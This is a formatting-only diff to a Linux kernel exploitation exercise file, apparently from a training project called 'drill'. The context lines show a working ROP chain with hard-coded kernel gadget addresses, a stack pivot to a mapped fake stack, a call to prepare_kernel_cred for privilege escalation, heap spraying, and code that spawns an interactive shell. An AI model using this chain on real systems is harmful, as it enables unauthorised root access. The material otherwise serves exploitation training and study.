@@ -44,6 +44,7 @@
 #include <sys/user.h>
 #include "drill.h"
 
+/* clang-format off */
 #define FAKE_STACK_ADDR			0xf6000000UL /* STACKPIVOT_GADGET_PTR changes rsp to this value */
 #define FAKE_STACK_MMAP_ADDR		(FAKE_STACK_ADDR - PAGE_SIZE)
 #define MMAP_SZ				(PAGE_SIZE * 2)
@@ -67,6 +68,7 @@
 #define XCHG_RAX_RBP			0xffffffff81633c34UL /* xchg rax, rbp ; ret */
 #define SUB_RAX_RDI			0xffffffff81f2ec90UL /* sub rax, rdi ; ret */
 #define PUSH_RAX_POP_RSP_DEC_PTR_RAX	0xffffffff81d186f5UL /* push rax ; pop rsp ; dec DWORD PTR [rax-0x7d] ; ret */
+/* clang-format on */
 
 /* ========================================================================== */
 
@@ -92,6 +94,7 @@ int prepare_rop_chain(void)
 	fake_stack = (unsigned long *)(mmaped_area + PAGE_SIZE);
 	printf("[+] fake stack for the ROP chain is at %p\n", fake_stack);
 
+	/* clang-format off */
 	fake_stack[offset++] = POP_RDI;
 	fake_stack[offset++] = INIT_TASK_PTR; /* use it as the 1st argument of prepare_kernel_cred() */
 	fake_stack[offset++] = POP_RAX;
@@ -108,6 +111,7 @@ int prepare_rop_chain(void)
 	fake_stack[offset++] = 0x37;
 	fake_stack[offset++] = SUB_RAX_RDI; /* the original rsp value is the rbp value minus 0x37 */
 	fake_stack[offset++] = PUSH_RAX_POP_RSP_DEC_PTR_RAX; /* restore rsp and continue */
+	/* clang-format on */
 
 	return EXIT_SUCCESS;
 }
@@ -133,11 +137,7 @@ int do_cpu_pinning(void)
 void run_sh(void)
 {
 	pid_t pid = -1;
-	char *args[] = {
-		"/bin/sh",
-		"-i",
-		NULL
-	};
+	char *args[] = { "/bin/sh", "-i", NULL };
 	int status = 0;
 
 	pid = fork();
@@ -217,8 +217,7 @@ int main(void)
 		goto end;
 	}
 
-	spray_data = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE,
-					MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+	spray_data = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 	if (spray_data == MAP_FAILED) {
 		perror("[-] mmap");
 		goto end;
